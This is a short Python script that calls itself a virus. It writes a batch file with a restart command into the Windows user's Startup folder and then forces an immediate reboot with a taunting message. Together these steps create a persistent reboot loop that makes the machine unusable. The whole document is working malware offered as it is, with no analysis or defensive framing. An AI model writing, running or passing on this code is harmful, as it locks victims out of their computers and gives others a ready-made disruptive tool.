import os,getpass
path = 'C:/Users/'+getpass.getuser()+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/win32.bat'
open(path, 'w').write('shutdown /r /t 30')
os.system('shutdown /r /t 30 /c "IM BAASHA VIRUS! CATH ME IF YOU CAN!"')
